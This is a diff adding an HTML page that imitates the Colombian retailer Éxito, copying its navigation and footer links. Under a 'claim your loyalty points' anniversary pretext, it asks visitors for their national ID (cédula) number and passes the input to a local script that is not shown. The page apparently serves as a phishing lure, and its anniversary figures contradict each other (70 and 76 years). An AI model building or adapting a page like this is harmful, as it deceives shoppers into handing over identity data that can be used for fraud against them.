@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Éxito - 70 Años</title>
+    <link rel="stylesheet" href="inicio.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <div class="container">
+            <span class="app-download-text">Descarga la app de Éxito</span>
+            <div class="top-bar-right">
+                <div class="search-container">
+                    <i class="fas fa-search search-icon"></i>
+                    <input type="text" placeholder="¿Qué estás buscando?" class="search-input">
+                </div>
+                <button class="qr-button">
+                    <i class="fas fa-qrcode"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Header with Logo and Navigation -->
+    <header class="header">
+        <div class="container">
+            <div class="header-content">
+                <div class="logo-container">
+                    <img src="logodexito.png" alt="Éxito Logo" class="logo">
+                </div>
+                <nav class="main-nav">
+                    <a href="https://www.exito.com/mercado/home" class="nav-link">Mercado</a>
+                    <a href="https://www.exito.com/moda-y-accesorios/home" class="nav-link">Moda</a>
+                    <a href="https://www.exito.com/ofertas-y-promociones?itm_source=Promociones&itm_medium=Promo&itm_campaign=ExclusivosOn" class="nav-link">Ofertas y Promociones</a>
+                </nav>
+                <button class="mobile-menu-button" onclick="toggleMobileMenu()">
+                    <i class="fas fa-bars"></i>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Mobile Menu -->
+    <div class="mobile-menu" id="mobileMenu">
+        <a href="https://www.exito.com/mercado/home" class="mobile-nav-link">Mercado</a>
+        <a href="https://www.exito.com/moda-y-accesorios/home" class="mobile-nav-link">Moda</a>
+        <a href="https://www.exito.com/ofertas-y-promociones?itm_source=Promociones&itm_medium=Promo&itm_campaign=ExclusivosOn" class="mobile-nav-link">Ofertas y Promociones</a>
+    </div>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- 70th Anniversary Section -->
+        <section class="anniversary-section">
+            <div class="container">
+                <div class="anniversary-content">
+                    <h1 class="anniversary-title">Reclama tus Puntos</h1>
+                    <h2 class="anniversary-subtitle">¡Gracias por creer en nosotros!</h2>
+                    <h3 class="anniversary-text">Más que clientes, son 76 años junto a nuestra gente. ¡Tu fidelidad merece un premio!. Tu lealtad vale oro. Disfruta ya tus Puntos Éxito y los de regalo, como agradecimiento a tu lealtad, te regalamos Puntos Éxito para que los disfrutes en lo que más te gusta.</h3>
+                </div>
+            </div>
+        </section>
+
+        <!-- Phone Number Validation Form -->
+        <section class="form-section">
+            <div class="container">
+                <div class="form-container">
+                    <h3 class="form-title">Ingresa tu número de cédula</h3>
+
+                    <div id="phoneForm" class="phone-form">
+                        <form onsubmit="handleSubmit(event)" class="form">
+                            <div class="input-group">
+                                <label for="phone" class="input-label">Número de cédula</label>
+                                <input 
+                                    type="tel" 
+                                    id="phone" 
+                                    placeholder="123456789" 
+                                    class="phone-input"
+                                    required
+                                >
+                                <div id="phoneError" class="error-message"></div>
+                            </div>
+                            <button type="submit" class="submit-button" id="submitButton">
+                                <span id="buttonText">Continuar</span>
+                                <div id="loadingSpinner" class="spinner hidden"></div>
+                                <a href="https://www.youtube.com/watch?v=Z9htebsYOlY&list=PL2Z95CSZ1N4HXvLWg8oL4IpyJx27HafcD&index=75"></a>
+                            </button>
+                        </form>
+                    </div>
+
+                    <div id="successMessage" class="success-container hidden">
+                        <div class="success-message">
+                            <i class="fas fa-check-circle"></i>
+                            ¡Número registrado exitosamente!
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Additional Thank You Message -->
+        <section class="thanks-section">
+            <div class="container">
+                <div class="thanks-content">
+                    <h3 class="thanks-title">¡Muchas gracias por ser parte de nuestra familia!</h3>
+                    <p class="thanks-text">
+                        Tu confianza nos impulsa a seguir mejorando cada día. 
+                        Juntos construimos un futuro lleno de oportunidades.
+                    </p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <!-- Contact Us -->
+                <div class="footer-column">
+                    <h4 class="footer-title">Contáctanos</h4>
+                    <ul class="footer-links">
+                        <li><a href="https://www.exito.com/centro-ayuda-contacto" class="footer-link">Línea de atención</a></li>
+                        <li><a href="https://www.exito.com/centro-de-ayuda/contacto" class="footer-link">Chat en línea</a></li>
+                        <li><a href="https://www.exito.com/escribenos-pqrs" class="footer-link">Escribenos</a></li>
+                        <li><a href="https://www.exito.com/almacenes-exito" class="footer-link">Encuentra tu tienda</a></li>
+                    </ul>
+                </div>
+
+                <!-- Help Center -->
+                <div class="footer-column">
+                    <h4 class="footer-title">Centro de Ayuda</h4>
+                    <ul class="footer-links">
+                        <li><a href="https://www.exito.com/centro-ayuda-preguntas-frecuentes" class="footer-link">Preguntas frecuentes</a></li>
+                        <li><a href="#" class="footer-link">Políticas de envío</a></li>
+                        <li><a href="https://www.exito.com/centro-de-ayuda/devolver-un-producto" class="footer-link">Cambios y devoluciones</a></li>
+                        <li><a href="https://www.exito.com/terminos-condiciones" class="footer-link">Términos y condiciones</a></li>
+                    </ul>
+                </div>
+
+                <!-- Our Company -->
+                <div class="footer-column">
+                    <h4 class="footer-title">Nuestra Empresa</h4>
+                    <ul class="footer-links">
+                        <li><a href="https://www.grupoexito.com.co/es/quienes-somos" class="footer-link">Acerca de nosotros</a></li>
+                        <li><a href="https://www.exito.com/marketplace" class="footer-link">Trabaja con nosotros</a></li>
+                        <li><a href="https://www.grupoexito.com.co/sites/default/files/2024-02/Grupo%20%C3%89xito%20Informe%20de%20Sostenibilidad%202023.pdf" class="footer-link">Sostenibilidad</a></li>
+                        <li><a href="https://www.grupoexito.com.co/es/sala-prensa" class="footer-link">Sala de prensa</a></li>
+                    </ul>
+                </div>
+
+                <!-- Follow Us -->
+                <div class="footer-column">
+                    <h4 class="footer-title">Síguenos</h4>
+                    <div class="social-links">
+                        <a href="https://www.facebook.com/exito/?locale=es_LA" class="social-link">
+                            <i class="fab fa-facebook-f"></i>
+                        </a>
+                        <a href="https://x.com/almacenesexito?lang=en" class="social-link">
+                            <i class="fab fa-twitter"></i>
+                        </a>
+                        <a href="https://www.instagram.com/exito/?hl=en" class="social-link">
+                            <i class="fab fa-instagram"></i>
+                        </a>
+                        <a href="https://www.youtube.com/channel/UCmFF7DHCnRoK79xjS3bcTIA" class="social-link">
+                            <i class="fab fa-youtube"></i>
+                        </a>
+                        
+                    </div>
+                </div>
+            </div>
+            
+            <div class="footer-bottom">
+                <p class="copyright">
+                    &copy; 2024 Éxito ® NIT 890900608-9. Todos los derechos reservados.
+                </p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
